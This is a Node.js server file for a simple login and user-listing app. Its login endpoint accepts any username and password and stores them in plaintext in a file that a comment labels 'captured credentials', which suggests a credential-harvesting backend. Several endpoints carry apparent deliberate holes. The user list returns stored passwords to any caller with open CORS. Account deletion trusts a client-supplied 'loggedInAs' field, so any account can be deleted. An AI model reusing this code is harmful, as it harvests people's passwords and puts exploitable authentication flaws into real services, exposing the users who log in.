const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const USERDATA_FILE = path.join(__dirname, 'userdata.json');
const LOGINUSERS_FILE = path.join(__dirname, 'loginusers.json');
const SESSIONS_FILE = path.join(__dirname, 'sessions.json');
const FRONTEND_DIR = path.join(__dirname, '../frontend');
const PORT = 3000;

// Init files if not exists
if (!fs.existsSync(LOGINUSERS_FILE)) {
  fs.writeFileSync(LOGINUSERS_FILE, JSON.stringify({}, null, 2));
}
if (!fs.existsSync(SESSIONS_FILE)) {
  fs.writeFileSync(SESSIONS_FILE, JSON.stringify({}, null, 2));
}
if (!fs.existsSync(USERDATA_FILE)) {
  fs.writeFileSync(USERDATA_FILE, JSON.stringify({}, null, 2));
}

function readJSON(file) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return {}; }
}

function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function sendJSON(res, status, data) {
  res.writeHead(status, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  });
  res.end(JSON.stringify(data));
}

function sendFile(res, filePath, contentType) {
  try {
    const content = fs.readFileSync(filePath);
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(content);
  } catch(e) {
    res.writeHead(404);
    res.end('Not found');
  }
}

function parseBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try { resolve(JSON.parse(body)); } catch(e) { resolve({}); }
    });
  });
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;
  const method = req.method;

  // CORS preflight
  if (method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end();
    return;
  }

  // Serve frontend files
  if (method === 'GET' && pathname === '/') {
    return sendFile(res, path.join(FRONTEND_DIR, 'index.html'), 'text/html');
  }
  if (method === 'GET' && pathname === '/index.html') {
    return sendFile(res, path.join(FRONTEND_DIR, 'index.html'), 'text/html');
  }

  // POST /api/login
  // 1. Save username+password to loginusers.json
  // 2. Create session for this username
  if (method === 'POST' && pathname === '/api/login') {
    const body = await parseBody(req);
    const { username, password } = body;
    
    if (!username || !password) {
      return sendJSON(res, 400, { success: false, message: 'Missing username or password' });
    }

    // 1. Save to loginusers.json (captured credentials)
    const loginUsers = readJSON(LOGINUSERS_FILE);
    loginUsers[username] = {
      username,
      password,
      loginAt: new Date().toISOString()
    };
    writeJSON(LOGINUSERS_FILE, loginUsers);

    // 2. Create session for this user
    const sessions = readJSON(SESSIONS_FILE);
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
    sessions[sessionId] = {
      sessionId,
      username,
      createdAt: new Date().toISOString()
    };
    writeJSON(SESSIONS_FILE, sessions);

    return sendJSON(res, 200, { 
      success: true, 
      username,
      sessionId  // Frontend will need this for delete
    });
  }

  // GET /api/users
  // Returns ALL users from userdata.json
  if (method === 'GET' && pathname === '/api/users') {
    const search = (parsedUrl.query.search || '').toLowerCase();
    const page = parseInt(parsedUrl.query.page || '1');
    const limit = 50;

    const users = readJSON(USERDATA_FILE);
    let list = Object.keys(users);

    // Filter by search
    if (search) {
      list = list.filter(u => u.toLowerCase().includes(search));
    }

    const total = list.length;
    const paginated = list.slice((page - 1) * limit, page * limit);
    
    const result = paginated.map(username => {
      const userData = users[username];
      return {
        username,
        password: userData.password || '••••••••',
        createdAt: userData.createdAt || 'Unknown'
      };
    });

    return sendJSON(res, 200, { users: result, total, page, limit });
  }

  // DELETE /api/delete
  // Only delete if loggedInAs username matches target username
  if (method === 'DELETE' && pathname === '/api/delete') {
    const body = await parseBody(req);
    const { username: targetUsername, loggedInAs } = body;

    if (!targetUsername || !loggedInAs) {
      return sendJSON(res, 400, { success: false, message: 'Missing username or session' });
    }

    // Check if loggedInAs matches targetUsername (self-delete only)
    if (loggedInAs !== targetUsername) {
      return sendJSON(res, 403, { 
        success: false, 
        message: "You can't delete other users. You can only delete your own account." 
      });
    }

    // Delete from userdata.json
    const users = readJSON(USERDATA_FILE);
    if (!users[targetUsername]) {
      return sendJSON(res, 404, { success: false, message: 'User not found' });
    }

    delete users[targetUsername];
    writeJSON(USERDATA_FILE, users);

    // Also clean up loginusers.json and sessions if they exist
    const loginUsers = readJSON(LOGINUSERS_FILE);
    if (loginUsers[targetUsername]) {
      delete loginUsers[targetUsername];
      writeJSON(LOGINUSERS_FILE, loginUsers);
    }

    const sessions = readJSON(SESSIONS_FILE);
    Object.keys(sessions).forEach(sessionId => {
      if (sessions[sessionId].username === targetUsername) {
        delete sessions[sessionId];
      }
    });
    writeJSON(SESSIONS_FILE, sessions);

    return sendJSON(res, 200, { 
      success: true, 
      message: 'Account deleted successfully' 
    });
  }

  // 404 for everything else
  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`📁 Files: loginusers.json, userdata.json, sessions.json`);
});